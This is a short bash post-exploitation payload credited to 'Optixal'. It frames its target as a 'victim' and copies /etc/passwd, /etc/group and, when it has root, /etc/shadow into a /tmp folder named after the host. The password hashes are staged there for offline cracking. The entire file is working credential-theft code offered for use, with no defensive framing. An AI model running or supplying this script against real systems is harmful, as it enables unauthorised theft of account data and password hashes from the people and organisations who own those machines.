#!/bin/bash
# Made by Optixal

# PAYLOAD INFO:
# Dumps passwd and shadow file

# VICTIM'S REQUIREMENTS:
# [Optional] Root access for shadow file

# MISC:
# N/A

# CONFIG:
SIGNATURE=/tmp/pwn_

status="\033[1m\033[94m[*]\033[0m"
good="\033[1m\033[92m[+] SUCCESS:\033[0m"
error="\033[1m\033[91m[-] ERROR:\033[0m"
money="\033[1m\033[92m[$] KACHING:\033[0m"

DUMPHASHTO=${SIGNATURE}${HOSTNAME}_hashes
mkdir $DUMPHASHTO

if cat /etc/passwd > $DUMPHASHTO/passwd.txt 2> /dev/null
then
	echo -e "$good Dumped passwd file... Done."
else
	echo -e "$error Failed to dump passwd file."
	rmdir $DUMPHASHTO
	exit 1
fi

if cat /etc/group > $DUMPHASHTO/group.txt 2> /dev/null
then
	echo -e "$good Dumped group file... Done."
else
	echo -e "$error Failed to dump group file."
fi

if cat /etc/shadow > $DUMPHASHTO/shadow.txt 2> /dev/null
then
	echo -e "$good Dumped shadow file... Done."
else
	echo -e "$error Failed to dump shadow file, no permission."
fi

